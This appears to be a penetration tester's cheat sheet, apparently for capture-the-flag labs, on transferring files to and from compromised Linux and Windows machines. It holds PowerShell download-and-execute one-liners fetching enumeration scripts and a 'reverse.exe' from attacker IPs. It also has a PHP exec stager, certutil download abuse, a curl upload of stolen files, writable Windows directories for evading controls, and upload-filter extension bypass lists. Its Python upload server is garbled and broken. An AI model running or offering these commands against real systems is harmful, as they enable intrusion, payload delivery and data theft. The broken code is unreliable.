# Linux

wget http://IP:PORT/FILE
# python 
python -m SimpleHTTPServer
python3 -m http.server

## http sever saves POST request data

```python
#!/usr/bin/python 
import SimpleHTTPServer
import BaseHTTPServer class SputHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler): 
def do_PUT(self):
	print self.headers
	length = int(self.headers["Content-Length"]) 
	path = self.translate_path(self.path) 
	with open(path, "wb") as dst: 
	    dst.write(self.rfile.read(length)) 

    
 if __name__ == '__main__': 
	SimpleHTTPServer.test(HandlerClass=SputHTTPRequestHandler)
```




# Windows 

## Writable Directories
```
C:\Windows\Tasks 

C:\Windows\Temp 

C:\windows\tracing

C:\Windows\Registration\CRMLog

C:\Windows\System32\FxsTmp

C:\Windows\System32\com\dmp

C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys

C:\Windows\System32\spool\PRINTERS

C:\Windows\System32\spool\SERVERS

C:\Windows\System32\spool\drivers\color

C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter

C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)

C:\Windows\SysWOW64\FxsTmp

C:\Windows\SysWOW64\com\dmp

C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter

C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```

## Powershell
```powershell
Powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/winpeas.bat')"

IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/winpeas.bat')

Invoke-WebRequest -Uri 10.10.16.4/winpeas.bat -OutFile winpeas.bat

IWR -Uri http://10.10.10.10/winpeas.bat -OutFile winpeas.bat

````


## Certutil
```bash
certutil -urlcache -f http://IP/FILE OUTPUTFILENAME
```

## SMB

### copy

![[SMB 443#SMB server]]
### connect smb windows powershell
```powershell


$pass = convertto-securestring '1234' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('super', $pass)
New-PSDrive -Name super -PSProvider FileSystem -Credential 
$cred -Root \\10.10.17.185\super

# add $pass variable with the share password 1234
# add $cred with the share creds username: super password: $pass variable
# New-PSDrive mount share

```
### Mount share

```
net use z: \\10.10.10.10\SHARENAME
```

# php
```php
<?php echo exec("powershell -command \"(New-Object System.Net.WebClient).DownloadFile('http://10.10.17.185/FILE_NAME','OUT_FILE_NAME')\""); ?>
```

```powershell
powershell Invoke-WebRequest -Uri http://10.10.16.4/winpeas.bat -OutFile winpeas.bat

powershell Invoke-WebRequest -Uri http://10.10.16.4/reverse.exe -OutFile ke.exe

```

# scp 
scp [OPTION] [user@]SRC_HOST:]file1 user@target:/tmp/FILE:
SCP -i KEY FILE user@target:/tmp/FILE:
-i for ssh key
P - Specifies the remote host ssh port.
-p - Preserves files modification and access times.
-q - Use this option if you want to suppress the progress meter and non-error messages.
-C - This option forces scp to compresses the data as it is sent to the destination machine.
```bash
scp [OPTION] [user@]SRC_HOST:]file1 user@target:/tmp/FILE:

scp charix@10.10.10.84:secret.zip . # getting secret.zip from charix usuer

```
# Curl
```bash
# Upload file with curl
curl DEST_IP --upload-file FILE
curl 192.77.184.2 --upload-file flag.zip
```





# FTP
python -m pyftpdlib 21
ftp 10.10.10.10




```
Invoke-WebRequest -Uri http//192.168.181.128/linPEAS.ps1 -OutFile
File C:\Users\administrator\Documents\WindowsPowerShell\Modules\Recon\adPEAS.ps1
```

# Extension evasion

**File Upload General Methodology**
Other useful extensions:
PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, phar .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module

  Working in PHPv8: .php, .php4, .php5, .phtml, .module, .inc, .hphp, .ctp

ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
Jsp: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
Coldfusion: .cfm, .cfml, .cfc, .dbm
Flash: .swf
Perl: .pl, .cgi
Erlang Yaws Web Server: .yaws




 